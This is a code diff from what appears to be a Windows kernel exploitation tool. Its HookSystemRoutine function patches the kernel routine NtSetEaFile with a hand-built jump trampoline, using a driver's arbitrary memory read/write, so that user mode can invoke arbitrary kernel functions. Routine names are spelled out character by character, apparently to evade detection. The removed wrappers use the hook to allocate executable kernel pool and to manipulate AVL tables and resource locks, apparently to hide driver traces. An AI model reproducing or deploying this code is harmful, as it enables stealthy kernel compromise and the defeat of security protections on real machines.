@@ -1,42 +1,47 @@
 #include "main.h"
 
-NTSTATUS HookSystemRoutine(_In_ PDEVICE_DRIVER_OBJECT Driver, _In_ ULONGLONG NewAddress, _Out_writes_bytes_(12) PUCHAR Native)
+NTSTATUS HookSystemRoutine(
+    _In_ PDEVICE_DRIVER_OBJECT Driver,
+    _In_ ULONGLONG NewAddress,
+    _Out_writes_bytes_(12) PUCHAR Native)
 {
-    UCHAR shellcode[12];
-    NTSTATUS status;
-    ULONGLONG routineAddr;
-    WCHAR routineName[12];
-    routineName[0]  = L'N';
-    routineName[1]  = L't';
-    routineName[2]  = L'S';
-    routineName[3]  = L'e';
-    routineName[4]  = L't';
-    routineName[5]  = L'E';
-    routineName[6]  = L'a';
-    routineName[7]  = L'F';
-    routineName[8]  = L'i';
-    routineName[9]  = L'l';
-    routineName[10] = L'e';
-    routineName[11] = L'\0';
+    UCHAR Shellcode[12];
+    NTSTATUS Status;
+    ULONGLONG Address;
+    WCHAR RoutineName[12];
+    RoutineName[0]  = L'N';
+    RoutineName[1]  = L't';
+    RoutineName[2]  = L'S';
+    RoutineName[3]  = L'e';
+    RoutineName[4]  = L't';
+    RoutineName[5]  = L'E';
+    RoutineName[6]  = L'a';
+    RoutineName[7]  = L'F';
+    RoutineName[8]  = L'i';
+    RoutineName[9]  = L'l';
+    RoutineName[10] = L'e';
+    RoutineName[11] = L'\0';
 
-    routineAddr = GetSystemRoutineAddressW(routineName);
-    if (routineAddr == 0)
-        return STATUS_NOT_FOUND;
-
-    RTL_ASSERT(routineAddr != 0);
-    RtlZeroMemory(shellcode, sizeof(shellcode));
-    shellcode[0]               = 0x48;
-    shellcode[1]               = 0xb8;
-    *(ULONGLONG*)&shellcode[2] = NewAddress;
-    shellcode[10]              = 0xff;
-    shellcode[11]              = 0xe0;
-
-    status = Driver->ReadMemory(Driver->DeviceHandle, routineAddr, Native, sizeof(shellcode));
-    if NT_SUCCESS (status) {
-        status = Driver->WriteMemory(Driver->DeviceHandle, routineAddr, shellcode, sizeof(shellcode));
+    Address = GetSystemRoutineAddressW(RoutineName);
+    if (Address == 0) {
+        Status = STATUS_NOT_FOUND;
+        DEBUG_PRINT_NTERROR(Status);
+        return Status;
     }
 
-    return status;
+    RtlZeroMemory(Shellcode, sizeof(Shellcode));
+    Shellcode[0]               = 0x48;
+    Shellcode[1]               = 0xB8;
+    *(ULONGLONG*)&Shellcode[2] = NewAddress;
+    Shellcode[10]              = 0xFF;
+    Shellcode[11]              = 0xE0;
+
+    Status = Driver->ReadMemory(Driver->DeviceHandle, Address, Native, sizeof(Shellcode));
+    if NT_SUCCESS (Status) {
+        Status = Driver->WriteMemory(Driver->DeviceHandle, Address, Shellcode, sizeof(Shellcode));
+    }
+
+    return Status;
 }
 
 NTSTATUS UnhookSystemRoutine(_In_ PDEVICE_DRIVER_OBJECT Driver, _In_reads_bytes_(12) PUCHAR Native)
@@ -61,152 +66,4 @@ NTSTATUS UnhookSystemRoutine(_In_ PDEVICE_DRIVER_OBJECT Driver, _In_reads_bytes_
         return STATUS_NOT_FOUND;
 
     return Driver->WriteMemory(Driver->DeviceHandle, routineAddr, Native, 12);
-}
-
-ULONGLONG ExAllocatePool2(_In_ PDEVICE_DRIVER_OBJECT Driver, _In_ SIZE_T NumberOfBytes)
-{
-    typedef ULONGLONG (*ROUTINE_TYPE)(ULONGLONG, SIZE_T, ULONG);
-    ROUTINE_TYPE Routine;
-    ULONGLONG Result;
-    ULONGLONG PoolFlags;
-    ULONGLONG Address;
-    UCHAR buffer[12];
-
-    WCHAR routineName[16];
-    routineName[0]  = L'E';
-    routineName[1]  = L'x';
-    routineName[2]  = L'A';
-    routineName[3]  = L'l';
-    routineName[4]  = L'l';
-    routineName[5]  = L'o';
-    routineName[6]  = L'c';
-    routineName[7]  = L'a';
-    routineName[8]  = L't';
-    routineName[9]  = L'e';
-    routineName[10] = L'P';
-    routineName[11] = L'o';
-    routineName[12] = L'o';
-    routineName[13] = L'l';
-    routineName[14] = L'2';
-    routineName[15] = L'\0';
-
-    Result    = 0;
-    Address   = GetSystemRoutineAddressW(routineName);
-    PoolFlags = 0x0000000000000080UI64; // NonPagedPool Execute
-
-    if NT_SUCCESS (HookSystemRoutine(Driver, Address, buffer)) {
-        Routine = (ROUTINE_TYPE)NtSetEaFile;
-        Result  = Routine(PoolFlags, NumberOfBytes, 'enoN');
-
-        UnhookSystemRoutine(Driver, buffer);
-    }
-
-    return Result;
-}
-
-VOID ExFreePool(_In_ PDEVICE_DRIVER_OBJECT Driver, _In_ ULONGLONG Pointer)
-{
-    typedef VOID (*ROUTINE_TYPE)(ULONGLONG, ULONG);
-    ROUTINE_TYPE Routine;
-    ULONGLONG Address;
-    UCHAR buffer[12];
-
-    WCHAR routineName[18];
-    routineName[0]  = L'E';
-    routineName[1]  = L'x';
-    routineName[2]  = L'F';
-    routineName[3]  = L'r';
-    routineName[4]  = L'e';
-    routineName[5]  = L'e';
-    routineName[6]  = L'P';
-    routineName[7]  = L'o';
-    routineName[8]  = L'o';
-    routineName[9]  = L'l';
-    routineName[10] = L'W';
-    routineName[11] = L'i';
-    routineName[12] = L't';
-    routineName[13] = L'h';
-    routineName[14] = L'T';
-    routineName[15] = L'a';
-    routineName[16] = L'g';
-    routineName[17] = L'\0';
-
-    Address = GetSystemRoutineAddressW(routineName);
-    if NT_SUCCESS (HookSystemRoutine(Driver, Address, buffer)) {
-        Routine = (ROUTINE_TYPE)NtSetEaFile;
-        Routine(Pointer, 'enoN');
-        UnhookSystemRoutine(Driver, buffer);
-    }
-}
-
-VOID ExReleaseResourceLite(_In_ PDEVICE_DRIVER_OBJECT Driver, _In_ PVOID Resource)
-{
-    typedef VOID (*ROUTINE_TYPE)(PVOID);
-    ROUTINE_TYPE Routine;
-    ULONGLONG Address;
-    UCHAR buffer[12];
-
-    Address = GetSystemRoutineAddressW(L"ExReleaseResourceLite");
-    if NT_SUCCESS (HookSystemRoutine(Driver, Address, buffer)) {
-        Routine = (ROUTINE_TYPE)NtSetEaFile;
-        Routine(Resource);
-        UnhookSystemRoutine(Driver, buffer);
-    }
-}
-
-BOOLEAN ExAcquireResourceExclusiveLite(_In_ PDEVICE_DRIVER_OBJECT Driver, _In_ PVOID Resource, _In_ BOOLEAN Wait)
-{
-    typedef BOOLEAN (*ROUTINE_TYPE)(PVOID, BOOLEAN);
-    ROUTINE_TYPE Routine;
-    BOOLEAN Result;
-    ULONGLONG Address;
-    UCHAR buffer[12];
-
-    Result  = FALSE;
-    Address = GetSystemRoutineAddressW(L"ExAcquireResourceExclusiveLite");
-    if NT_SUCCESS (HookSystemRoutine(Driver, Address, buffer)) {
-        Routine = (ROUTINE_TYPE)NtSetEaFile;
-        Result  = Routine(Resource, Wait);
-        UnhookSystemRoutine(Driver, buffer);
-    }
-
-    return Result;
-}
-
-BOOLEAN KiRtlDeleteElementGenericTableAvl(_In_ PDEVICE_DRIVER_OBJECT Driver, _In_ PRTL_AVL_TABLE Table, _In_ PVOID Buffer)
-{
-    typedef BOOLEAN (*ROUTINE_TYPE)(PRTL_AVL_TABLE, PVOID);
-    ROUTINE_TYPE Routine;
-    BOOLEAN Result;
-    ULONGLONG Address;
-    UCHAR buffer[12];
-
-    Result  = FALSE;
-    Address = GetSystemRoutineAddressW(L"RtlDeleteElementGenericTableAvl");
-    if NT_SUCCESS (HookSystemRoutine(Driver, Address, buffer)) {
-        Routine = (ROUTINE_TYPE)NtSetEaFile;
-        Result  = Routine(Table, Buffer);
-        UnhookSystemRoutine(Driver, buffer);
-    }
-
-    return Result;
-}
-
-PVOID KiRtlLookupElementGenericTableAvl(_In_ PDEVICE_DRIVER_OBJECT Driver, _In_ PRTL_AVL_TABLE Table, _In_ PVOID Buffer)
-{
-    typedef PVOID (*ROUTINE_TYPE)(PRTL_AVL_TABLE, PVOID);
-    ROUTINE_TYPE Routine;
-    PVOID Result;
-    ULONGLONG Address;
-    UCHAR buffer[12];
-
-    Result  = FALSE;
-    Address = GetSystemRoutineAddressW(L"RtlLookupElementGenericTableAvl");
-    if NT_SUCCESS (HookSystemRoutine(Driver, Address, buffer)) {
-        Routine = (ROUTINE_TYPE)NtSetEaFile;
-        Result  = Routine(Table, Buffer);
-        UnhookSystemRoutine(Driver, buffer);
-    }
-
-    return Result;
 }
